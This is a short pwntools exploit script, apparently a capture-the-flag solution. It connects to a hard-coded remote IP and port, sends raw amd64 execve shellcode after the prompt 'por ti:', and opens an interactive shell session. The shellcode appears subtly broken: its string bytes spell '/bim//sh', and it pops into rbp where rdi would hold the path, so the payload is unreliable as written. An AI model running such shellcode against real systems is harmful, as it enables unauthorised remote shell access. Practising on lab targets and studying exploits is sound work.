from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = 'debug'

p = remote('52.33.132.169', 1443)

payload = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6d\x2f\x2f\x73\x68\x53\x54\x5d\xb0\x3b\x0f\x05'

p.sendlineafter("por ti:", payload)
p.interactive()
